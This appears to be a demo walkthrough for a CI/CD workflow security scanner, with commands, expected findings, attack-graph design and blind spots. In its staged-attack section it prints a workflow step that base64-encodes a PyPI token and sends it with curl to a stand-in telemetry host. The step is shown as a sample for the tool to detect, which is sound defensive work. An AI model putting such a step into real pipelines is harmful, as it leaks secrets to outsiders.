# Demo walkthrough

The commands to run during a code review, in order, with what each one proves.

Assumes three sibling directories:

```
ci-cd-pipeline-scanner/   <- the tool
github-actions-goat/      <- demo target 1: real vulnerable workflows
demo-repo/                <- demo target 2: staged attack in git history
```

Set them up from **inside** `ci-cd-pipeline-scanner`:

```bash
pip install -e ".[dev]"
git clone https://github.com/step-security/github-actions-goat.git ../github-actions-goat
python examples/build_cicd_demo.py ../demo-repo --force
```

Note the `../` — clone the targets *beside* the repo, not inside it. Both
commands are safe to re-run: `git clone` refuses if the directory exists
(harmless), and the demo builder needs `--force` to replace an existing copy.

---

## Verify everything works before you present

```bash
python smoke_test.py
```

Runs every command below against the real targets, checks each one produced
what this document claims, and writes all output to `demo-output/`. Exits
non-zero if anything fails. Set `GEMINI_API_KEY` first if you want it to
exercise the live LLM path too.

Expect **42 checks passed**, and:

```
Output saved in: demo-output/
Open the diagram: demo-output/graph/attack_graph.svg
```

If preflight fails, `python -m cicd_detector --version` must print `0.2.0`.
If it errors, the editable install points at a different directory — re-run
`pip install -e .` from inside this repo.

---

## 0. The framing

> In March 2025 someone compromised `tj-actions/changed-files` and moved a git
> *tag*. Thousands of repositories ran attacker code on their next build, with
> their secrets in the environment. Nobody pushed a commit to any victim repo.
> Nothing in their `git log` changed.

Establish early: every finding is either an **OBSERVED** fact read from a file
or an **INFERRED** judgement built on those facts. Attack paths are inferred.
The tool never claims an attack *happened* — only that the configuration
permits one.

---

## 1. Scan the vulnerable repo

```bash
python -m cicd_detector scan ../github-actions-goat --no-llm --top 3
```

Expect: 24/24 workflows parsed, 0 rule errors, 229 findings
(CRITICAL=5, HIGH=48, MEDIUM=12, LOW=163, INFO=1), graph of ~502 nodes.

**The point:** the number isn't 229, it's that 5 are CRITICAL and the rest rank
below them.

### It finds the real tj-actions bug

```
HIGH     SCRIPT_INJECTION   ...incident.yaml:33
MEDIUM   ACTION_UNPINNED    ...incident.yaml:29
```

Prove the line numbers live:

```bash
sed -n '29,33p' ../github-actions-goat/.github/workflows/tj-actions-changed-files-incident.yaml
```

### It grades instead of shouting

Same trigger, two honest answers:

| Workflow · job | Verdict | Why |
|---|---|---|
| `toc-tou.yml` · `vulnerable-pattern` | CRITICAL | `gh pr checkout` pulls fork code, then runs commands |
| `PRTargetWorkflow.yml` · `pr-target-check` | LOW | bare `actions/checkout` gets the *base* branch |

### It stays quiet on decoys

`secret-in-build-log.yml` has two `echo`s in a step holding a GCP key:

```yaml
PRIVATE_KEY=$(echo $GCP_SERVICE_ACCOUNT_KEY | jq -r '.private_key')
echo "Using the private key for some operation"     # decoy, NOT reported
echo "GCP Private Key: $PRIVATE_KEY"                # reported, line 29
```

Taint tracking, not grep. Flagged `derived: true` — GitHub masks the *exact*
secret string, and a value that has been through `jq` no longer matches.

---

## 2. Scan the staged-attack repo

```bash
python -m cicd_detector scan ../demo-repo --no-llm
```

Three commits, each of which passes review alone:

| Commit | Change | Reads as |
|---|---|---|
| C1 | adds `build-helpers/version-utils@v2` | "stop hand-maintaining the version" |
| C2 | `contents/packages/id-token: write` | "release job needs to push" |
| C3 | adds a telemetry step | "track release durations" |

C3 is the payload — the token is never named on the `curl` line, it arrives as
`$BUILD_ID`, two assignments away:

```yaml
RELEASE_TOKEN: ${{ secrets.PYPI_API_TOKEN }}
run: |
  BUILD_ID=$(echo "$RELEASE_TOKEN" | base64 -w0)
  curl -sS -X POST -d "build=$BUILD_ID" https://build-telemetry.example.net/ingest
```

Caught as `CRITICAL SECRET_EXPOSURE release.yml:30`.

### The temporal half — the strongest moment

```bash
python -m cicd_detector analyze ../demo-repo --rule WORKFLOW_HISTORY_CHANGE
```

The **same contributor** widened the token in one commit, then added the
network call in another, days later. Neither is damning alone.

---

## 3. The DAG

```bash
python -m cicd_detector graph ../demo-repo --output-dir ./graph
```

```
attack graph: 48 nodes, 104 edges
attack paths: 4
  json / svg / dot / graphml
```

**Open `graph/attack_graph.svg` in a browser.** It is rendered directly and
needs no Graphviz — nodes are laid out in columns by role, with attack-path
edges highlighted in red. (If you *do* have Graphviz, `dot -Tsvg
graph/attack_graph.dot -o full.svg` gives a full node-level layout instead.)

**Two layers over one set of nodes.** Structural edges come from the file
(workflow *contains* job); security edges come from findings (secret *sends_to*
host) and exist **only where a rule produced evidence**. `add_edge()` refuses an
unevidenced security edge and records the refusal.

**Paths are searched on roles**, not fixed node sequences:

```
ENTRY_POINT -> EXECUTION -> PRIVILEGE -> ASSET -> IMPACT
```

**Have this answer ready.** The first working version of the graph produced
attack paths that did not exist:

1. shared `ubuntu-latest` runner node joined all 26 Goat jobs;
2. shared `actions/checkout` node let a path enter one workflow and exit
   through another's runner;
3. severity inflated by findings that merely sat near a route.

All three found by running it on real data, all three fixed, each with a
regression test. *In a reachability graph, any node shared between contexts is a
false-transitivity bug waiting to happen.*

---

## 4. The rules

```bash
python -m cicd_detector rules
python -m cicd_detector rules --explain SECRET_EXPOSURE
```

Every rule is graded, not binary. `ACTION_UNPINNED` alone spans four severities:

| Reference | Severity |
|---|---|
| `evil/action@main` + write perms | CRITICAL |
| `vendor/tool@v1.2.3` + secrets | HIGH |
| `vendor/tool@v1`, bare job | MEDIUM |
| `actions/checkout@v4` | LOW |
| `actions/checkout@8f4b7f8…` (40-hex) | not reported |

Severity and confidence are separate: detecting an unpinned action is
near-certain (0.95); whether it is CRITICAL or LOW is about reachability.

---

## 5. Blind spots — volunteer these

| Blind spot | Why |
|---|---|
| Injection inside a **local composite action** | only `.github/workflows/*.yml` is parsed |
| **Reusable workflow calls** not followed | the called file is scanned standalone, but the call edge isn't traced |
| `if:` conditions not evaluated | a step behind `if: false` is still analysed (over-reports) |
| Where a tag **points now** | `@v35` flagged as mutable, but not resolved — needs network |
| **Effective** token permissions | with no `permissions:` block, scopes come from repo settings |
| Whether a workflow **ever ran** | that's in the Actions run log |
| Taint **across steps** | tracking is within one `run:` block |
| Non-GitHub CI | GitLab/Jenkins/CircleCI recognised but not parsed |

The honest one-liner: **reachable is not exploited.**

---

## 6. The LLM layer

Two different things get called "correlation". Do not let the room conflate them:

| | Who does it | Needs a key? |
|---|---|---|
| Graph path correlation | networkx searching the DAG | **No** |
| LLM correlation | Gemini, actually reasoning | **Yes** |

Everything in steps 1–4 is plain algorithms, no AI, no network.

```powershell
$env:GEMINI_API_KEY = "..."          # PowerShell
```
```bash
export GEMINI_API_KEY="..."          # bash
pip install -e ".[dev,llm]"
python -m cicd_detector scan ../demo-repo    # no --no-llm
```

Default model is `gemini-3.6-flash` (free tier serves flash, not pro).
Override with `--model`. Without a key the step is skipped and says so — never
faked.

Guardrails: it may only cite finding IDs it was given (others are stripped and
recorded); it cannot claim an attack happened; and its failure leaves the
deterministic report unchanged.

**The best moment:** on `demo-repo` the model connects *two workflows* —
compromise `pr-preview.yml`, use `contents: write` to push a tag, that tag
fires `release.yml`, which holds the PyPI token. The graph deliberately does
**not** assert that path, because it scopes nodes per workflow to avoid the
false-transitivity bug above. The graph refuses to claim what it cannot
evidence; the model proposes the hypothesis a human checks.

---

## 7. Tests

```bash
pytest -q -k cicd      # 137 pass
pytest -q              # 342 pass, 11 pre-existing Windows failures
```

The 11 are Windows-only: the original suite creates filenames with newlines,
tabs and non-UTF-8 bytes, which NTFS forbids. They fail identically on the
unmodified commit (verified by stashing) and pass on Linux CI.

---

## 8. Dogfooding

```bash
python -m cicd_detector scan . --no-llm --no-history
```

Flags three things in our own `ci.yml` — an undeclared `permissions:` block and
two unpinned first-party actions:

```yaml
permissions:
  contents: read

      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262  # v4
      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065  # v5
```
